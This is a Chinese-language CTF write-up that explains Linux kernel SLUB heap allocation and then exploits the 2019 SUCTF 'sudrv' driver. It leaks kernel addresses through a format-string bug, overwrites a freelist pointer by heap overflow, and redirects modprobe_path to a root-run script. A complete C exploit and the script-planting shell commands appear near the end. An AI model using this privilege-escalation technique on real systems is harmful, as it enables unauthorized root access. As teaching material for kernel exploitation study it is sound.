## 一、前言

在如今的CTF比赛大环境下，掌握glibc堆内存分配已经成为了大家的必修课程。然而在内核态中，堆内存的分配策略发生了变化。笔者会在介绍内核堆利用方式之前先简单的介绍一下自己了解的内核内存分配策略，如有不对的地方欢迎师傅们指正。

## 二、前置知识

在Linux系统中通过分段与分页机制将物理内存划分成4kb大小的内存页，而涉及到内存分配不可避免的就会产生外部碎片与内部碎片问题，这个在物理页中也是一样的，为了避免这种情况内核管理物理页采用了两个策略：buddy
system与slub算法。

伙伴系统（buddy
system）以页为单位对内存进行管理，将相同大小的连续物理页以链表形式进行管理，物理页就像手拉手的好伙伴一样，这就是伙伴系统名字的由来。所有的空闲页以11个链表进行管理(2^n)，而系统申请的内存大小总是能在伙伴系统中找到合适的范围，可以避免因为分配次数过多而产生外部碎片的情况。

当内核申请内存时，伙伴系统以页为单位进行分配，而内核在很多情况下并不需要一整页的内存空间，往往只需要很小的内存空间，而这也就造成了内部碎片的产生，而slub算法正是为了满足系统申请小内存的需求。​

slub算法从伙伴系统申请空闲的内存页即slab，slab是由一个或多个内存页构成（一般为单页）。并把这个slab划分为一个个object，并将这些object组成一个单向链表进行管理，这里需要注意slub系统把内存块当成object看待，而不是伙伴系统中的页。当系统申请小内存时slub算法会根据kmem_cache_cpu中slab是否存在空闲object来进行操作：

1、kmem_cache_cpu中的slab存在空闲object，则直接分配object。

2、kmem_cache_cpu中的slab不存在空闲object，则会将全部分配的slab加入到kmem_cache_node的full链中，并从partial链中取出一个部分分配的slab，分配object给系统。​

3、kmem_cache_cpu中的slab不存在空闲object且kmem_cache_node中也不存在半空闲的object，则会将全部分配的slab加入到kmem_cache_node的full链中，并向伙伴系统申请新的空闲页，分配object给系统。

## 三、漏洞演示

在前置知识中我们简单的介绍了内核内存分配策略，并且我们不难发现slub算法的管理方式与glibc中fastbin链类似，都是单链表形式管理，所以当内核存在堆溢出漏洞时我们完全可以通过修改其fd指针将我们想要进行写入的内存地址加入到freelist中。利用思路不算很难但是在实际利用中往往会因为环境中的一些随机性而增加利用的难度。​

本次选择演示的例题是2019-SUCTF的sudrv例题，查看start.sh中的信息可以发现开启了kaslr保护与smep保护。

    
    
    #! /bin/sh  
    ​  
    qemu-system-x86_64 \  
    -m 128M \  
    -kernel ./bzImage \  
    -initrd  ./rootfs.cpio \  
    -append "root=/dev/ram rw console=ttyS0 oops=panic panic=1 kaslr" \  
    -monitor /dev/null \  
    -nographic 2>/dev/null \  
    -smp cores=2,threads=1 \  
    -s \  
    -cpu kvm64,+smep

ida反编译程序，查看sudrv_ioctl函数内容。

![image-20220325153409845.png](https://image.3001.net/images/20220422/1650593405_62620e7ddbf59466c85f8.png!small)

可以看出ioctl中实现了三种功能，具体如下所示：

    
    
    0x73311337 --> 申请堆块  
    0xDEADBEEF --> 调用sudrv_ioctl_cold_2函数  
    0x13377331 --> 释放堆块

其中sudrv_ioctl_cold_2函数的内容如下所示，发现其调用printk函数，格式化参数存于se_buf中，因题目环境未做出限制故我们可以通过dmesg命令查看printk函数的输出。

    
    
    void __fastcall sudrv_ioctl_cold_2(__int64 se_buf, __int64 a2)  
    {  
    printk(se_buf, a2);  
    JUMPOUT(0x38LL);  
    }

模块中定义了sudrv_write函数，这个函数中使用的copy_user_generic_unrolled未对输入长度进行检测，存在堆溢出，并且su_buf作为printk函数中格式化字符串参数的位置，同时存在格式化字符串漏洞。

    
    
    __int64 sudrv_write()  
    {  
    if ( copy_user_generic_unrolled(su_buf) )  
    return -1LL;  
    else  
    return sudrv_write_cold_1();  
    }

找到了漏洞点以后我们就可以构思利用思路了，结合我们之前学到的内核利用知识不难想到大体的利用思路框架

    
    
    找到漏洞点 --> 绕过保护 --> 提权 --> 返回用户态获取rootshell

KASLR保护我们可以通过修改start.sh的kaslr为nokaslr暂时关闭保护，利用格式化漏洞泄露出地址后计算出相应偏移即可绕过KASLR保护。

SMEP保护即内核态禁止执行用户态代码，我们可以通过BYPASS_SMEP修改cr4寄存器的值关闭SMEP保护，再通过swapgs和iretq完成用户态的跳转即可获取到rootshell。

而关于如何劫持程序控制流，我们在前置知识中了解到了内核内存分配机制，并且在本题中存在堆溢出漏洞。我们可以通过格式化字符串泄露出栈地址并利用堆溢出漏洞覆盖掉在freelist中空间堆块的fd指针为栈地址，这样我们再申请堆内存即可申请到栈地址上，覆盖函数返回地址为我们布置的ropchain即可劫持程序流。

![image-20220322163955976.png](https://image.3001.net/images/20220422/1650593406_62620e7e7fe8036f179e0.png!small)

整体的利用思路就是这样，但是内核环境往往伴随着随机性，经常会出现的一种情况就是在freelist的空闲object并不是按照地址顺序进行排列的，这也就造成了往往我们通过堆溢出覆盖在freelist中object的fd指针。

    
    
    预期期望堆溢出前：  
    se_buf -地址连续-> 空闲object -(fd)-> 空闲object  
    预期期望堆溢出后：  
    se_buf -地址连续-> 空闲object -(覆盖fd指针)-> 栈地址  
    +------------------------------------------------+  
    实际环境中可能出现的情况：  
    se_buf -地址不连续-> 空闲object -(fd)-> 空闲object  
    #因虚拟地址不连续，故无法通过溢出覆盖掉freelist中object的fd指针。

通过gdb远程动调我们可以看到内核内存的变化情况，在执行完kmalloc函数的时候观察rax中freelist的情况。​

可以看到0x2f000结尾的object为我们通过kmalloc申请到的地址，然而其指向的下一个object地址并不是0x30000而是以0x2b000结尾，也就是说freelist中的内存地址会因为内核函数的调用而产生消耗，从而影响我们的布局利用。

![image-20220322101321210.png](https://image.3001.net/images/20220422/1650593407_62620e7f3dae42095e351.png!small)

即使我们成功劫持了程序流执行了ropchain，也会出现在提权时发生内核错误从而重启的情况。所以我们再利用本题的时候选择换一种思路，将原先的栈地址换成modprob_path地址加入到freelist链表中。在这里简单介绍一下为什么我们要劫持这个地址。

当内核执行一个错误的文件或未知文件类型的时候，就会调用modprob_path所指向的程序，如果我们修改他所指向的程序为我们自己写的一个sh文件，并利用system或execve函数去执行一个位置类型的文件，那么在发生错误的时候就会以root权限执行我们自己写的sh文件中的内容。

我们可以在自己的exp中通过system函数创建一个sh文件将root权限下的flag文件拷贝到tmp目录下并赋予777的权限。

    
    
    system("echo -ne '#!/bin/sh\n/bin/cp /Flag/flag /tmp/flag\n/bin/chmod 777 /tmp/flag' > /tmp/getflag.sh");  
    system("chmod +x /tmp/getflag.sh");  
    system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/fl");  
    system("chmod +x /tmp/fl");

modprob_path的地址并不能从/proc/kallsyms中找到地址，不过我们可以通过其他函数对于modprob_path的引用找到它的地址。在/proc/kallsyms中查找__request_module函数地址，然后在gdb中查看函数的汇编信息，就可以找到modprob_path的地址。

![image-20220323170309924.png](https://image.3001.net/images/20220422/1650593408_62620e80191450a5e0f12.png!small)

我们在sudrv_write函数处下断点，然后在调用copy_user_generic_unrolled时可以发现其rdi指向的正是我们的modprob_path地址，rsi中为我们要写入的字符串。

![image-20220323180342870.png](https://image.3001.net/images/20220422/1650593408_62620e80ec83b8c7f637b.png!small)

ni继续往下走，发现已经成功写入。

![image-20220323180408369.png](https://image.3001.net/images/20220422/1650593409_62620e81ad38b43ed02e1.png!small)

完整EXP如下所示：

    
    
    #include <string.h>  
    #include <stdio.h>  
    #include <stdlib.h>  
    #include <unistd.h>  
    #include <pthread.h>  
    #include <fcntl.h>  
    #include <sys/stat.h>  
    #include <sys/types.h>  
    #include <sys/ioctl.h>  
    #define KMALLOC 0x73311337  
    #define PRINTK  0xDEADBEEF  
    #define KFREE   0x13377331  
    ​  
    unsigned long long int user_cs, user_ss, user_rflags, user_sp;  
    unsigned long long int raw_kernel_addr = 0xffffffff811c827f;  
    ​  
    void main() {  
    unsigned long long int kernel_addr = 0;  
    unsigned long long int overflow[0x201] = {0};  
    int fd = open("/dev/meizijiutql", O_WRONLY);  
    char tmp_str[0x30];  
    ​  
    system("echo -ne '#!/bin/sh\n/bin/cp /Flag/flag /tmp/flag\n/bin/chmod 777 /tmp/flag' > /tmp/getflag.sh");  
    system("chmod +x /tmp/getflag.sh");  
    system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/fl");  
    system("chmod +x /tmp/fl");  
    ​  
    ioctl(fd, KMALLOC, 0xff0);  
    ioctl(fd, KMALLOC, 0xff0);  
    ioctl(fd, KMALLOC, 0xff0);  
    char *str = "%llx %llx %llx %llx %llx kernel: %llx %llx %llx %llx stack: %llx %llx";  
    write(fd, str, strlen(str));  
    // full printk buffer  
    ioctl(fd, PRINTK);  
    ioctl(fd, PRINTK);  
    ​  
    system("dmesg |grep kernel | grep stack | cut -b 42-58 | head -1 > tmp.txt");  
    ​  
    int fd_tmp = open("./tmp.txt", 2);  
    read(fd_tmp, tmp_str, sizeof(tmp_str));  
    sscanf(tmp_str, "%llx", &kernel_addr);      
    ​  
    unsigned long long int offset = kernel_addr - raw_kernel_addr;  
    unsigned long long int modprob_path = 0xffffffff82242320 + offset;  
    printf("modprob_path: 0x%llx \n", modprob_path);  
    ​  
    // // heap overflow  
    overflow[0x200] = modprob_path;  
    ioctl(fd, KMALLOC, 0xff0);  
    write(fd, overflow, sizeof(overflow));   
    ​  
    ioctl(fd, KMALLOC, 0xff0);  
    write(fd, "/tmp/getflag.sh", 0x10);  
    ioctl(fd, KMALLOC, 0xff0);  
    write(fd, "/tmp/getflag.sh", 0x10);  
    ioctl(fd, KMALLOC, 0xff0);  
    write(fd, "/tmp/getflag.sh", 0x10);  
    ​  
    system("/tmp/fl");  
    system("cat /tmp/flag");  
    ​  
    }

![image-20220325173920282.png](https://image.3001.net/images/20220422/1650593410_62620e82493b7a57868c7.png!small)

## 四、总结

修改modprob_path中的字符串指向我们创建的sh文件的利用办法在有任意地址写入的时候是非常简洁有效的，相较于ROP需要先bypass然后再提权返回用户态相比不仅简练而且成功率要更高，而本文中仅仅是对内核内存分配策略进行了一些简单的概念性描述，而想要学的更加深入的师傅这边还是推荐再阅读完本篇文章后再去自主了解一些内核内存分配所涉及的关键代码，相信在学习的过程中你一定会有所收获的。

